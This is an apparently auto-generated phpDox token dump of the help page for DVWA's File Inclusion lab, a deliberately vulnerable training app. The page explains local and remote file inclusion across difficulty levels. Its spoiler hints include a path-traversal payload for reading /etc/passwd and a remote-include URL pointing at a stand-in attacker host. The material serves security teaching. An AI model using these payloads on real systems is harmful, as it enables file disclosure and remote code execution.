<?xml version="1.0"?>
<source xmlns="http://xml.phpdox.net/token">
  <file xmlns="http://xml.phpdox.net/src" path="/home/user/Documents/DVWA-master/build/../src/vulnerabilities/fi/help" file="help.php" realpath="/home/user/Documents/DVWA-master/src/vulnerabilities/fi/help/help.php" size="2985" time="2017-02-13T08:45:28+00:00" unixtime="1486975528" sha1="68a4b4aa99d0da136a622bfe844846c17a1fb0eb" relative="vulnerabilities/fi/help/help.php"/>
  <line no="1">
    <token name="T_INLINE_HTML">&lt;div class="body_padded"&gt;</token>
  </line>
  <line no="2">
    <token name="T_INLINE_HTML">	&lt;h1&gt;Help - File Inclusion&lt;/h1&gt;</token>
  </line>
  <line no="3"/>
  <line no="4">
    <token name="T_INLINE_HTML">	&lt;div id="code"&gt;</token>
  </line>
  <line no="5">
    <token name="T_INLINE_HTML">	&lt;table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid"&gt;</token>
  </line>
  <line no="6">
    <token name="T_INLINE_HTML">	&lt;tr&gt;</token>
  </line>
  <line no="7">
    <token name="T_INLINE_HTML">	&lt;td&gt;&lt;div id="code"&gt;</token>
  </line>
  <line no="8">
    <token name="T_INLINE_HTML">		&lt;h3&gt;About&lt;/h3&gt;</token>
  </line>
  <line no="9">
    <token name="T_INLINE_HTML">		&lt;p&gt;Some web applications allow the user to specify input that is used directly into file streams or allows the user to upload files to the server.</token>
  </line>
  <line no="10">
    <token name="T_INLINE_HTML">			At a later time the web application accesses the user supplied input in the web applications context. By doing this, the web application is allowing</token>
  </line>
  <line no="11">
    <token name="T_INLINE_HTML">			the potential for malicious file execution.&lt;/p&gt;</token>
  </line>
  <line no="12"/>
  <line no="13">
    <token name="T_INLINE_HTML">		&lt;p&gt;If the file chosen to be included is local on the target machine, it is called "Local File Inclusion (LFI). But files may also be included on other</token>
  </line>
  <line no="14">
    <token name="T_INLINE_HTML">			machines, which then the attack is a "Remote File Inclusion (RFI).&lt;/p&gt;</token>
  </line>
  <line no="15"/>
  <line no="16">
    <token name="T_INLINE_HTML">		&lt;p&gt;When RFI is not an option. using another vulnerability with LFI (such as file upload and directory traversal) can often achieve the same effect.&lt;/p&gt;</token>
  </line>
  <line no="17"/>
  <line no="18">
    <token name="T_INLINE_HTML">		&lt;p&gt;Note, the term "file inclusion" is not the same as "arbitrary file access" or "file disclosure".&lt;/p&gt;</token>
  </line>
  <line no="19"/>
  <line no="20">
    <token name="T_INLINE_HTML">		&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;</token>
  </line>
  <line no="21"/>
  <line no="22">
    <token name="T_INLINE_HTML">		&lt;h3&gt;Objective&lt;/h3&gt;</token>
  </line>
  <line no="23">
    <token name="T_INLINE_HTML">		&lt;p&gt;Read all &lt;u&gt;five&lt;/u&gt; famous quotes from '&lt;a href="../hackable/flags/fi.php"&gt;../hackable/flags/fi.php&lt;/a&gt;' using only the file inclusion.&lt;/p&gt;</token>
  </line>
  <line no="24"/>
  <line no="25">
    <token name="T_INLINE_HTML">		&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;</token>
  </line>
  <line no="26"/>
  <line no="27">
    <token name="T_INLINE_HTML">		&lt;h3&gt;Low Level&lt;/h3&gt;</token>
  </line>
  <line no="28">
    <token name="T_INLINE_HTML">		&lt;p&gt;This allows for direct input into &lt;u&gt;one of many PHP functions&lt;/u&gt; that will include the content when executing.&lt;/p&gt;</token>
  </line>
  <line no="29"/>
  <line no="30">
    <token name="T_INLINE_HTML">		&lt;p&gt;Depending on the web service configuration will depend if RFI is a possibility.&lt;/p&gt;</token>
  </line>
  <line no="31">
    <token name="T_INLINE_HTML">		&lt;pre&gt;Spoiler: &lt;span class="spoiler"&gt;LFI: ?page=../../../../../../etc/passwd&lt;/span&gt;.</token>
  </line>
  <line no="32">
    <token name="T_INLINE_HTML">			Spoiler: &lt;span class="spoiler"&gt;RFI: ?page=http://www.evilsite.com/evil.php&lt;/span&gt;.&lt;/pre&gt;</token>
  </line>
  <line no="33"/>
  <line no="34">
    <token name="T_INLINE_HTML">		&lt;br /&gt;</token>
  </line>
  <line no="35"/>
  <line no="36">
    <token name="T_INLINE_HTML">		&lt;h3&gt;Medium Level&lt;/h3&gt;</token>
  </line>
  <line no="37">
    <token name="T_INLINE_HTML">		&lt;p&gt;The developer has read up on some of the issues with LFI/RFI, and decided to filter the input. However, the patterns that are used, isn't enough.&lt;/p&gt;</token>
  </line>
  <line no="38">
    <token name="T_INLINE_HTML">		&lt;pre&gt;Spoiler: &lt;span class="spoiler"&gt;LFI: Possible, due to it only cycling through the pattern matching once&lt;/span&gt;.</token>
  </line>
  <line no="39">
    <token name="T_INLINE_HTML">			Spoiler: &lt;span class="spoiler"&gt;RFI: </token>
    <token name="T_OPEN_TAG">&lt;?php </token>
    <token name="T_ECHO">echo</token>
    <token name="T_WHITESPACE"> </token>
    <token name="T_STRING">dvwaExternalLinkUrlGet</token>
    <token name="T_PHPDOX_OPEN_BRACKET">(</token>
    <token name="T_WHITESPACE"> </token>
    <token name="T_CONSTANT_ENCAPSED_STRING">'https://secure.php.net/manual/en/wrappers.php'</token>
    <token name="T_PHPDOX_COMMA">,</token>
    <token name="T_WHITESPACE"> </token>
    <token name="T_CONSTANT_ENCAPSED_STRING">'PHP Streams'</token>
    <token name="T_WHITESPACE"> </token>
    <token name="T_PHPDOX_CLOSE_BRACKET">)</token>
    <token name="T_PHPDOX_SEMICOLON">;</token>
    <token name="T_WHITESPACE"> </token>
    <token name="T_CLOSE_TAG">?&gt;</token>
    <token name="T_INLINE_HTML">&lt;/span&gt;.&lt;/pre&gt;</token>
  </line>
  <line no="40"/>
  <line no="41">
    <token name="T_INLINE_HTML">		&lt;br /&gt;</token>
  </line>
  <line no="42"/>
  <line no="43">
    <token name="T_INLINE_HTML">		&lt;h3&gt;High Level&lt;/h3&gt;</token>
  </line>
  <line no="44">
    <token name="T_INLINE_HTML">		&lt;p&gt;The developer has had enough. They decided to only allow certain files to be used. However as there are multiple files with the same basename,</token>
  </line>
  <line no="45">
    <token name="T_INLINE_HTML">			they use a wildcard to include them all.&lt;/p&gt;</token>
  </line>
  <line no="46">
    <token name="T_INLINE_HTML">		&lt;pre&gt;Spoiler: &lt;span class="spoiler"&gt;LFI: The filename only has start with a certain value.&lt;/span&gt;.</token>
  </line>
  <line no="47">
    <token name="T_INLINE_HTML">			Spoiler: &lt;span class="spoiler"&gt;RFI: Need to link in another vulnerability, such as file upload&lt;/span&gt;.&lt;/pre&gt;</token>
  </line>
  <line no="48"/>
  <line no="49">
    <token name="T_INLINE_HTML">		&lt;br /&gt;</token>
  </line>
  <line no="50"/>
  <line no="51">
    <token name="T_INLINE_HTML">		&lt;h3&gt;Impossible Level&lt;/h3&gt;</token>
  </line>
  <line no="52">
    <token name="T_INLINE_HTML">		&lt;p&gt;The developer calls it quits and hardcodes only the allowed pages, with there exact filenames. By doing this, it removes all avenues of attack.&lt;/p&gt;</token>
  </line>
  <line no="53">
    <token name="T_INLINE_HTML">	&lt;/div&gt;&lt;/td&gt;</token>
  </line>
  <line no="54">
    <token name="T_INLINE_HTML">	&lt;/tr&gt;</token>
  </line>
  <line no="55">
    <token name="T_INLINE_HTML">	&lt;/table&gt;</token>
  </line>
  <line no="56"/>
  <line no="57">
    <token name="T_INLINE_HTML">	&lt;/div&gt;</token>
  </line>
  <line no="58"/>
  <line no="59">
    <token name="T_INLINE_HTML">	&lt;br /&gt;</token>
  </line>
  <line no="60"/>
  <line no="61">
    <token name="T_INLINE_HTML">	&lt;p&gt;Reference: </token>
    <token name="T_OPEN_TAG">&lt;?php </token>
    <token name="T_ECHO">echo</token>
    <token name="T_WHITESPACE"> </token>
    <token name="T_STRING">dvwaExternalLinkUrlGet</token>
    <token name="T_PHPDOX_OPEN_BRACKET">(</token>
    <token name="T_WHITESPACE"> </token>
    <token name="T_CONSTANT_ENCAPSED_STRING">'https://www.owasp.org/index.php/Top_10_2007-A3'</token>
    <token name="T_WHITESPACE"> </token>
    <token name="T_PHPDOX_CLOSE_BRACKET">)</token>
    <token name="T_PHPDOX_SEMICOLON">;</token>
    <token name="T_WHITESPACE"> </token>
    <token name="T_CLOSE_TAG">?&gt;</token>
    <token name="T_INLINE_HTML">&lt;/p&gt;</token>
  </line>
  <line no="62"/>
  <line no="63">
    <token name="T_INLINE_HTML">&lt;/div&gt;</token>
  </line>
  <line no="64"/>
</source>
